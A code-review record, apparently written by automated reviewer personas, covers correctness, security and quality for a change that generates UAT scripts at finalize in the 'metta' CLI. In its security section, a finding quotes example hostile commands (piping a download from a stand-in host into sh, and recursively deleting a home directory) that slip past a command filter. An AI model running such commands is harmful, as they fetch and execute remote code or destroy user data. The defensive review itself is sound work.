# Review: uat-document-generation-at-finalize-every-finalized-change

Three parallel reviewer personas; all verdicts PASS_WITH_WARNINGS; zero critical or major findings. Warning-level findings are recorded below verbatim for follow-up consideration; none block verification.

| Persona | Verdict | Critical | Major |
|---|---|---|---|
| Correctness | PASS_WITH_WARNINGS | 0 | 0 |
| Security | PASS_WITH_WARNINGS | 0 | 0 |
| Quality | PASS_WITH_WARNINGS | 0 | 0 |

---

## Correctness review

VERDICT: PASS_WITH_WARNINGS

# Correctness Review: uat-document-generation-at-finalize-every-finalized-change

Scope: commits `8003a0d04..9a2abfc37` (diff `2fc869140..HEAD -- src tests`), reviewed against
`spec.md` (9 ADDED requirements), `design.md` (authoritative per tasks.md), and `tasks.md`.
All claims below were verified by reading the code, running targeted regex probes under node,
and running the five touched test files (69/69 pass) plus `npx tsc --noEmit` (clean).

## Summary

The implementation is faithful to the design and satisfies every spec scenario I could trace.
No critical or major correctness defects found. Three minor issues (a silently dropped warning,
a fragile ENOENT detection, and an inaccurate warning message) and three informational notes.

## Verified-correct highlights (checked, not assumed)

- **Six FinalizeResult return literals** — all six paths updated: incomplete artifacts
  (`src/finalize/finalizer.ts:86`), dry-run-merge conflict (:104), gate failure (:129),
  caller dry-run (:145), applying-merge conflict (:161) all carry `uatPath: null`; success
  (:248-249) carries the derived `uatPath` plus conditional `uatError` spread. Compiler-enforced
  (`tsc --noEmit` clean).
- **Step 5b placement** — after the real merge write and its conflict return (:150-163),
  before `archive()` (:196). All failure/dry-run exits are structurally upstream, so "No Stray
  UAT On Failed Finalize Paths" holds by construction; pinned by tests
  (`tests/finalizer.test.ts:500-591`).
- **Path handling** — `uatPath` derived from `archive()`'s returned name via `join()`
  (`finalizer.ts:196-197`), never a pre-computed `<date>-<name>`; no string concatenation
  anywhere in the new path logic. `changeDir` is `join(this.specDir, 'changes', changeName)`,
  consistent with the rest of the class.
- **US-id word boundary** — `new RegExp('\\b' + storyId + '\\b')`
  (`src/finalize/uat-generator.ts:156`): verified under node that `\bUS-1\b` does NOT match
  inside `"US-12 verified by tests"` (digit-digit is not a boundary) and does match `"US-1:"`.
  Story ids are parser-guaranteed `US-\d+`, so the unescaped interpolation is safe (hyphen is
  literal outside a character class). Test at `tests/uat-generator.test.ts:388` pins this.
- **15-char floor** — applied to the *normalized* scenario name and requirement name
  independently (`uat-generator.ts:143,147`), matching design clause 1+2; clause 3
  (US-id + verification-context line) applied only to AC-derived steps (:294), clauses 1+2 only
  to scenario-derived steps (:327,:362) — consistent with the design ("deriving requirement"
  exists only for scenario steps). `gatesOk = gates.length > 0 && gatesPassed` (:457) correctly
  refuses vacuous zero-gate passes as evidence.
- **Command extraction** — `COMMAND_FILTER_RE` (`uat-generator.ts:69`) verified under node:
  accepts `metta finalize --json`, `npm run build`; rejects `UAT.md` (single token) and
  `uat.enabled: false` (colon breaks the first-token class). Max-2 slice and first-match
  dedupe (:76) match design. ITC fallback hint attaches only to a story's first step and only
  when no AC in the story yielded a command (:298-306); `steps[0]` access is safe because
  `flushStory` (`src/specs/stories-parser.ts:92-98`) rejects zero-AC stories, so kind
  `'stories'` guarantees ≥1 AC per story.
- **Dedupe normalization** — scenario `norm(split.doText + ' ' + split.observe)` compared
  against AC `norm(ac.when + ' ' + ac.then)` (:296,:335-336); both sides computed from
  *un-hinted* text (hints applied only to the rendered `doText`), same-story only,
  exact-normalized only. Matches design; pinned by `tests/uat-generator.test.ts:232`.
- **Tier ladder edge cases** — sentinel stories → tier 2 silently (kind check :490); stories
  ENOENT → silent demote; malformed stories → warn + demote; tier-2 acceptance is content-based
  (`liveScenarioCount > 0`, :472-474) because `parseDeltaSpec` provably never throws (pure
  mdast traversal, `src/specs/spec-parser.ts:179-289`), so garbage spec.md demotes on content
  (pinned at `tests/uat-generator.test.ts:281`); spec.md ENOENT vs other read errors
  distinguished by `code !== 'ENOENT'` (:467); floor script guarantees never-skip.
- **Per-story step numbering** — `Step ${groupIndex+1}.${stepIndex+1}` (:418), per-group,
  folded delta steps continue the story's K sequence, dangling scenarios form a trailing
  group numbered after the stories. Pinned at `tests/uat-generator.test.ts:125,215,229`.
- **Determinism** — the generator never reads the clock (`generatedAt` injected, verified: no
  `Date` usage in `uat-generator.ts`); no locale-dependent APIs; all iteration is over parser
  arrays in document order; `TemplateEngine.substitute` uses a function callback
  (`src/templates/template-engine.ts:40-42`), so `$&`-style patterns and stray `{word}` tokens
  in assembled body text are inserted literally and never re-scanned. `new Date()` appears
  only in the finalizer (caller side), as the spec permits. Byte-identical test at
  `tests/uat-generator.test.ts:459`.
- **Degradation catch** — `uatError` is assigned *before* the best-effort cleanup
  (`finalizer.ts:187-191`); the cleanup `rm(..., { force: true }).catch(() => {})` cannot throw
  or mask the original error; `uatGenerated` stays false so `uatPath` is null; archive, gate
  recording, docs, and the success return all proceed. Exit stays 0 (CLI test
  `tests/cli-finalize.test.ts:200-218`).
- **Config toggle** — `UatConfigSchema` strict with `enabled: z.boolean().default(true)`,
  registered as `uat: UatConfigSchema.default({})` on the already-`.strict()`
  `ProjectConfigSchema` (`src/schemas/project-config.ts:41-46,104`). Omitted key → enabled;
  unknown key and non-boolean rejected (config-loader tests pass).
- **CLI output** — success JSON gains `uatPath` (always) + conditional `uatWarning`
  (`src/cli/commands/finalize.ts:146-147`); the five error shapes and exit codes are untouched
  (verified by reading the full command body; key-set equality pinned at
  `tests/cli-finalize.test.ts:234`); human mode prints the UAT line only when `uatPath` is
  non-null and the yellow warning on stderr only when degraded (:172-173).

## Issues Found

### Critical (must fix)

None.

### Warnings (should fix)

- `src/finalize/uat-generator.ts:463-470, 490-499` — **Non-ENOENT spec.md read error is
  silently dropped when tier 1 is selected.** `specReadError` is only surfaced on the tier-3
  branch (:498-499). If `stories.md` parses (tier 1) but `spec.md` exists and fails to read
  (e.g. EACCES), delta folding is silently skipped with no entry in `### Generation notes` and
  no `warnings[]` entry — violating the design's warn-and-demote discipline ("read error →
  +warning", design.md Tier fallback tree) and quietly thinning the archived script.
  *Fix:* push `specReadError` into `warnings` unconditionally (immediately after the read),
  not only on the tier-3 path.

- `src/finalize/uat-generator.ts:481-485` — **ENOENT detection by message substring is
  fragile.** `err instanceof StoriesParseError && err.message.includes('not found')` relies on
  the exact wording `stories.md not found at <path>` (`src/specs/stories-parser.ts:142`). Any
  future StoriesParseError whose message happens to contain "not found" (e.g. a Zod schema
  message surfaced via `Stories document failed schema validation: ...`) would demote
  *silently* instead of with a warning. *Fix:* match the specific prefix
  (`err.message.startsWith('stories.md not found')`) or, better, add a `code`/flag to
  `StoriesParseError` for the ENOENT case. (Note: fixing the parser itself is out of scope —
  the spec forbids modifying `parseStories` behavior — but a prefix match is local to the
  generator.)

- `src/finalize/uat-generator.ts:484` — **Inaccurate demotion warning text.** The malformed-
  stories warning always says "falling back to spec scenarios", but when spec.md has no
  scenarios the run actually lands on tier 3 or floor — the archived floor document then
  carries a Generation note pointing at a fallback that did not happen (observable in the
  passing test `tests/uat-generator.test.ts:444-452`, where the floor doc contains both this
  message and the floor message). *Fix:* drop the destination clause ("; falling back to spec
  scenarios") or word it as "demoting to the next available tier".

### Suggestions (nice to have)

- `src/finalize/finalizer.ts:170-187` — The Step 5b catch also swallows `ConfigLoader.load()`
  failures, so an invalid `.metta/config.yaml` (including a bad `uat` block) surfaces as
  `Warning: UAT generation failed: <zod message>` on an otherwise-successful finalize. The
  spec's "Invalid uat config is rejected strictly" scenario is still satisfied at the schema
  level (rejection happens, is not coerced, and is visibly reported — not silently ignored),
  and Step 7 already had identical silent-swallow semantics for the same load, so this is
  consistent — but the "UAT generation failed" label is slightly misleading for what is a
  config problem. Consider distinguishing the config-load failure in the message.
- `src/finalize/uat-generator.ts:69` — `COMMAND_FILTER_RE` false-accepts multi-word prose in
  backticks (verified: `` `the file exists` `` passes the filter and would render as a `Run:`
  hint). This is the exact regex pinned by design.md (accepted risk, ADR-3/§norm helpers), so
  it is not a defect — recording it here so the accepted risk is on the review record.
- `src/finalize/finalizer.ts:179,196` — `generatedAt` (Step 5b) and `archive()`'s date stamp
  are computed at two different instants; a midnight (UTC) rollover between them can make the
  document's `Generated:` date differ by one day from the archive directory prefix. Path
  correctness is unaffected (path derives from `archive()`'s return, per ADR-1); cosmetic only.

## Spec scenario traceability (all 9 requirements)

| Requirement | Verdict | Evidence |
|---|---|---|
| UAT Script Generation At Finalize | satisfied | Step 5b placement `finalizer.ts:165-193`; sweep via `archive()` move; `uatPath` field; determinism + no-AI verified in generator source and tests |
| No Stray UAT On Failed Finalize Paths | satisfied | all five exits upstream of Step 5b; dry-run returns at :136 before 5b; `tests/finalizer.test.ts:500-591` |
| UAT Source Material Assembly | satisfied | `parseStories`/`parseDeltaSpec` consumed read-only; in-memory gate results per design ADR-5 (gates.yaml does not exist at Step 5b — deliberate, do not "fix"); best-effort annotation absent without error |
| UAT Document Format | satisfied | template header (change name, date, metta-issue instructions); `### US-N` groups, `#### Step N.K`, Setup/Do/Observe, `- [ ] Pass` per step |
| UAT Tier Fallback Chain | satisfied | 4-rung ladder incl. floor; never skips when enabled; sentinel/garbage/ENOENT cases all pinned by tests |
| UAT Configuration Toggle | satisfied | strict schema, defaults, disabled-skip (`finalizer.ts:174`), omitted-key valid |
| UAT Path In Finalize Output | satisfied | JSON `uatPath` always present on success shape, `uatWarning` only on degradation, error shapes byte-identical (key-set test) |
| UAT Template Externality | satisfied | external `src/templates/artifacts/uat.md`, TemplateEngine render, contract test greps `src/**/*.ts` for the sentinel, copy-templates untouched |
| UAT Generation Failure Degradation | satisfied | warn-and-continue catch, cleanup cannot mask the error, exit 0, no error-shape leakage |

One wording tension noted and accepted: the spec scenario "Stories and spec scenarios feed the
generated steps" says what-to-do text "derives from Independent Test Criteria"; the
implementation (per design ADR-3, adopted from research) derives step Do-text from AC WHEN
clauses with the ITC as group preamble and as the CLI-invocation hint source. design.md is the
authoritative resolution of this wording, so it is not counted as a defect.

## Verdict

PASS_WITH_WARNINGS — no must-fix defects; the three warnings are small, localized generator
improvements (dropped warning on tier-1 spec read error, fragile ENOENT string match,
inaccurate demotion message) that do not affect any spec scenario outcome.

---

## Security review

# Security Review: uat-document-generation-at-finalize-every-finalized-change

VERDICT: PASS_WITH_WARNINGS

Scope: `git diff 2fc869140..HEAD -- src tests`. Files reviewed in full:
`src/finalize/uat-generator.ts`, `src/finalize/finalizer.ts`, `src/cli/commands/finalize.ts`,
`src/schemas/project-config.ts`, `src/templates/artifacts/uat.md`, `src/index.ts`, plus the
supporting code they call (`src/templates/template-engine.ts`, `src/artifacts/artifact-store.ts`,
`src/specs/stories-parser.ts`, `src/specs/spec-parser.ts`, `src/config/config-loader.ts`,
`src/util/errors.ts`, `src/schemas/story.ts`, `src/state/state-store.ts`).

Threat model: local CLI; artifacts (`stories.md`, `spec.md`, `intent.md`, `summary.md`) are the
primary untrusted-ish input (same trust domain as the change author, but the generated UAT.md is
presented as a machine-produced trust artifact that humans are told not to edit).

## Findings

### Warnings (should fix)

**W1 — Markdown structure injection: artifact text with embedded newlines can forge UAT
document structure, including fake "Machine-verified" evidence lines.**
- Where: `src/finalize/uat-generator.ts:417-424` (`renderGroups` emits step fields on single
  `- **Do**:` / `- **Observe**:` lines), fed by text that can contain newlines:
  `src/specs/spec-parser.ts:146` / `:255` (scenario step `extractText` preserves soft-break
  `\n` inside paragraph text nodes), `src/specs/stories-parser.ts:68-70` (AC given/when/then),
  and `src/finalize/uat-generator.ts:169-183` (`mdText`/`listItemText` for intent/summary).
- Impact: a crafted multi-line acceptance criterion or scenario step (e.g. a soft-wrapped list
  item whose continuation line starts with `#### Step 9.9`, `- **Machine-verified** — ...`,
  `- [ ] Pass`, or `### Generation notes`) is rendered verbatim, letting artifact content
  fabricate steps, forge machine-verified annotations (which are supposed to be evidence-gated
  by `annotateScenarioStep`/`annotateAcStep`), or inject a fake generation-notes section. The
  template-placeholder route is closed (see I2), but the line-oriented markdown structure is not.
- Severity: Low-Medium. Exploitation requires authoring artifacts in the repo, i.e. the same
  trust domain that could edit most other files — but UAT.md is explicitly a "do not edit"
  trust artifact, so forged machine-verified lines have integrity value beyond ordinary edits.
- Suggested fix: collapse newlines in all step-level strings before rendering, e.g.
  `text.replace(/\s*\r?\n\s*/g, ' ')` applied in `renderGroups` (single choke point) to
  `title`, `setup`, `doText`, `observe`, `preamble`, `trace`, and heading-interpolated names
  (`story.title`, `requirement.name`, `scenario.name`).

**W2 — `Run:` hints re-present verbatim artifact commands as generator-suggested; filter
permits shell metacharacters.**
- Where: `src/finalize/uat-generator.ts:68-84`. `COMMAND_FILTER_RE`
  (`/^[A-Za-z][\w./-]*(?:\s+\S+)+$/`) constrains only the first token; subsequent `\S+` tokens
  admit `|`, `;`, `$()`, URLs, etc. — `curl evil.example/x | sh` and `rm -rf ~/code` both pass
  and get emitted as `(Run: \`...\`)`.
- What is done right: the backtick fencing itself is sound — `COMMAND_SPAN_RE` (`[^`\n]+`)
  guarantees the captured span contains no backticks or newlines, so re-wrapping in single
  backticks at `uat-generator.ts:83` cannot be broken out of, and the span cannot smash the
  surrounding line (modulo W1, which is about other fields too).
- Impact: a malicious artifact can smuggle a destructive command that reads as
  machine-endorsed guidance to the human/agent executing UAT. Same trust domain caveat as W1.
- Severity: Low.
- Suggested fix (any of): label hints as verbatim quotes from the source artifact (e.g.
  `(Run, quoted from artifact: ...)`); tighten the filter to reject tokens containing
  `|`, `;`, `&`, `$`, `>`, `<`; or add a standing caution line to
  `src/templates/artifacts/uat.md` telling reviewers to read commands before running them.

### Informational (no action required for this change)

**I1 — Path handling: no new traversal surface introduced.**
All new filesystem paths use constant segments around `changeName`:
`join(this.specDir, 'changes', changeName)` at `src/finalize/finalizer.ts:170`, the cleanup
`rm(join(..., changeName, 'UAT.md'), { force: true })` at `finalizer.ts:186`, and
`writeArtifact(changeName, 'UAT.md', ...)` at `finalizer.ts:178` (fileName is a literal;
`artifact-store.ts:135-137` joins under the state store base). `changeName` itself is not
segment-validated anywhere in the codebase (pre-existing pattern in `artifact-store.ts` and
`state-store.ts:76-78`); a user passing `../..` to a local CLI attacks only themselves. The
generator reads only fixed filenames (`summary.md`, `spec.md`, `stories.md`, `intent.md`)
under `changeDir` (`uat-generator.ts:453,465,479,504`). If hardening is ever wanted, add a
shared changeName segment validator — out of scope here.

**I2 — Template placeholder injection: verified closed.**
`TemplateEngine.substitute` (`src/templates/template-engine.ts:39-43`) uses
`String.prototype.replace` with a function callback: only the original template is scanned,
and replacement values (including artifact-derived `uat_steps` containing literal
`{change_name}` / `{generated_date}` / `{uat_steps}`) are inserted verbatim, never re-scanned
and never subject to `$&`-style expansion. No recursive substitution is possible. Minor
pre-existing nit: `context[key] ?? match` resolves inherited `Object.prototype` members for
placeholders like `{constructor}`, but templates are trusted build artifacts, so this is not
reachable by untrusted input.

**I3 — ReDoS: all regexes linear; dynamic RegExp input is schema-constrained.**
`COMMAND_SPAN_RE` excludes backticks/newlines from the repeated class; `COMMAND_FILTER_RE`'s
`(?:\s+\S+)+` alternates disjoint classes (no ambiguous backtracking); `norm`, `ROLE_RE`,
`VERIFY_CONTEXT_RE`, `HIGHLIGHT_H2_RE` are linear. The dynamically built
`new RegExp(\`\\b${storyId}\\b\`)` at `uat-generator.ts:156` is safe from regex injection:
story IDs are Zod-validated `^US-\d+$` (`src/schemas/story.ts:14`) via
`StoriesDocumentSchema.parse` before any story reaches the generator
(`src/specs/stories-parser.ts:282`). `storyNumber`'s `id.slice(3)` is likewise safe under
that schema.

**I4 — Degradation error message: no meaningful leak.**
`uatError = getErrorMessage(err)` (`finalizer.ts:184`, surfaced at
`src/cli/commands/finalize.ts:147` in JSON and `:173` on stderr) can contain local absolute
paths from fs errors. Output is consumed by the local operator; the same JSON already exposes
archive paths. No secrets, tokens, or cross-trust-boundary data. The partial-write cleanup
(`rm` with `force: true` + swallowed rejection, `finalizer.ts:185-187`) is correctly scoped
to the single `UAT.md` filename.

**I5 — Config: strict Zod, no new pollution vector.**
`UatConfigSchema` is `.strict()` with a defaulted boolean (`src/schemas/project-config.ts:41-43`),
nested in the top-level `.strict()` `ProjectConfigSchema` (`project-config.ts:104,113`).
Unknown keys under `uat:` are rejected. YAML parsing uses the `eemeli/yaml` package via the
pre-existing `ConfigLoader`; this change adds no new parsing path.

### Suggestions (nice to have)

**S1 — `new URL('../templates/artifacts', import.meta.url).pathname`**
(`src/finalize/uat-generator.ts:532`) percent-encodes spaces/non-ASCII in install paths,
which would make template load fail (triggering the degradation path, so fail-safe). This is
a robustness issue, not security, and matches the existing codebase pattern
(`src/cli/commands/gate.ts:17` etc.). Prefer `fileURLToPath` when the pattern is next touched
codebase-wide.

## Verdict

PASS_WITH_WARNINGS — no critical or exploitable-across-a-trust-boundary issues. W1 (newline
structure injection enabling forged Machine-verified lines) is the one finding worth fixing
before this generator's output is treated as a tamper-evident trust artifact; W2 is a cheap
labeling/filter hardening on top of already-sound backtick fencing.

---

## Quality review

# Quality Review: uat-document-generation-at-finalize-every-finalized-change

VERDICT: PASS_WITH_WARNINGS

Scope reviewed: `git diff 2fc869140..HEAD -- src tests` — src/finalize/uat-generator.ts (new, 541 lines),
src/finalize/finalizer.ts, src/cli/commands/finalize.ts, src/schemas/project-config.ts,
src/templates/artifacts/uat.md (new), src/index.ts, plus tests/uat-generator.test.ts,
tests/uat-template-contract.test.ts, tests/finalizer.test.ts, tests/cli-finalize.test.ts,
tests/config-loader.test.ts. All 45 new unit tests plus the 18 finalizer tests pass locally
(`npx vitest run` on the four non-subprocess files).

## Summary

Clean, convention-conformant implementation: functional core (pure helpers in uat-generator.ts) with
I/O at the edges, external template rendered via TemplateEngine (no string-literal template — enforced
by a sentinel-grep test), strict Zod config schema mirroring DocsConfigSchema, kebab-case filenames,
`.js` import extensions throughout, barrel export added in the existing finalize group of src/index.ts.
Test quality is above the repo baseline (byte-identical determinism check, negative annotation guards,
error-JSON shape locked via sorted key equality). No critical or major issues; findings below are
minor maintainability items and test-hygiene suggestions.

## Findings

### Critical

None.

### Major

None.

### Minor

1. **src/finalize/uat-generator.ts:481** — ENOENT detection for `stories.md` relies on a brittle
   string match against the parser's own error message: `err.message.includes('not found')`. If
   `StoriesParseError`'s wording in src/specs/stories-parser.ts:142 (`stories.md not found at ...`)
   ever changes, every quick-tier change with no stories.md would silently start emitting a spurious
   "stories.md failed to parse" warning into its Generation notes instead of demoting silently.
   `StoriesParseError` carries `field`/`storyId` but no machine-checkable code.
   *Suggested fix:* add a `code: 'ENOENT'` (or similar) discriminant to `StoriesParseError`, or
   probe file existence (readOptional-style) before calling `parseStories`.

2. **src/finalize/finalizer.ts:168** — `let configLoader: import('../config/config-loader.js').ConfigLoader | undefined`
   uses an inline dynamic-import type annotation. A top-level
   `import type { ConfigLoader } from '../config/config-loader.js'` is erased at compile time, keeps
   the runtime lazy-import intact, and matches the repo's import style elsewhere.
   *Suggested fix:* hoist to `import type` at the top of the file.

3. **tests/cli-finalize.test.ts:88-118** — `markAllArtifactsComplete` and `stubAllGatesPassing` are
   verbatim duplicates of the same helpers in tests/cli-complete.test.ts (~lines 1100-1133),
   including the identical five-gate name list and YAML body. A `tests/helpers/` directory already
   exists (cli.ts). Third copy-paste of fixture logic invites drift when the standard workflow's
   gate list changes.
   *Suggested fix:* extract both helpers into tests/helpers (e.g. `tests/helpers/finalize-fixtures.ts`).

4. **tests/cli-finalize.test.ts:180-215 with src/finalize/finalizer.ts:190-191** — the degraded-path
   CLI test injects failure by squatting a *directory* at `spec/changes/<name>/UAT.md`. The
   finalizer's best-effort cleanup `rm(path, { force: true })` is non-recursive, so it silently fails
   on that directory, and the empty `UAT.md/` directory is swept into the archive by the move. The
   test asserts `uatPath: null` and `uatWarning` but never asserts the archive contains no `UAT.md`
   entry — so the "no UAT.md is present in the archive" property from the degradation requirement is
   unverified (and technically violated) in this synthetic scenario. Real degradation paths leave a
   file (removed correctly) or nothing, so impact is test-only today.
   *Suggested fix:* assert archive contents in the CLI degraded test, and/or use
   `rm(..., { recursive: true, force: true })` in the cleanup.

### Suggestions

5. **src/finalize/uat-generator.ts:156** — `new RegExp(`\\b${storyId}\\b`)` interpolates the story id
   without regex-escaping. Safe today because the story schema enforces `/^US-\d+$/`
   (src/schemas/story.ts:14), but that invariant lives two files away. A one-line comment noting the
   schema guarantee (or a trivial escape) would prevent a future refactor of id formats from
   introducing a regex-injection footgun.

6. **tests/uat-generator.test.ts:479-485** — the no-AI guard asserts `/anthropic/i` never appears in
   the generator's source text. This is a weak proxy for "no provider client constructed" and will
   false-positive on an innocuous comment mentioning Anthropic. Consider asserting on import
   specifiers only (e.g. match `from '...` lines) or checking the resolved module graph.

7. **src/finalize/finalizer.ts:31 vs src/cli/commands/finalize.ts:147** — the internal field is
   `uatError` but it surfaces as `uatWarning` in JSON. The rename at the boundary is deliberate
   (spec mandates a warning field in the success payload) and both sides are documented, but a
   shared name would remove one mental translation. Cosmetic only.

## Checks performed (no findings)

- **Duplication vs src/util/**: `norm()` in uat-generator.ts:58 is a text-similarity normalizer
  (unicode-aware, space-preserving, backtick/bold stripping) — semantically distinct from
  `toSlug`/`toSlugUntruncated` in src/util/slug.ts (ASCII hyphen slugs). Not a duplicate; no other
  normalize helper exists in src/util/.
- **Dead code / unused exports**: none. All exports of uat-generator.ts (`generateUat`,
  `UatGeneratorInput`, `UatGeneratorResult`, `UatTier`) are consumed by finalizer/tests or are
  legitimate public API surfaced through the barrel. All mdast type imports are used.
- **Barrel export placement**: src/index.ts:23 adds `./finalize/uat-generator.js` adjacent to the
  other three `./finalize/*` exports — follows the existing grouping.
- **Naming**: `uatPath`/`uatWarning` camelCase matches the existing success-payload keys
  (`status`, `change`, `archive`, `gates`, `merged`); spec explicitly mandates `uatPath`.
- **Heading depth of `## Additional scenarios`** (uat-generator.ts:342) amid `###` story groups:
  matches design.md lines 262/332 exactly — intentional, not an inconsistency.
- **Date handling**: `generatedAt` injected by the caller (finalizer.ts:179) using the same
  UTC `toISOString().slice(0, 10)` idiom as `ArtifactStore.archive` (artifact-store.ts:109) —
  archive-name date and UAT header date cannot diverge; generator provably never reads the clock.
- **Template externality**: uat.md ships via the existing `copy-templates` glob
  (`cp -r src/templates/artifacts` in package.json:18) with no build-script change; sentinel-grep
  test (uat-template-contract.test.ts:58-70) enforces no string-literal copy in src.
- **Guard against empty `story.acceptanceCriteria[0]` access** (uat-generator.ts:303): safe —
  schema enforces `.min(1)` on acceptanceCriteria (src/schemas/story.ts:21).
- **Test-to-source ratio**: new source file has a dedicated 486-line test file plus a template
  contract file; finalizer and CLI changes covered in their existing test files. Ratio maintained.
- **`new URL(...).pathname` for template dir** (uat-generator.ts:532): POSIX-only, but identical to
  the pre-existing pattern in cli/commands/finalize.ts:36,41 — consistent, not new debt.
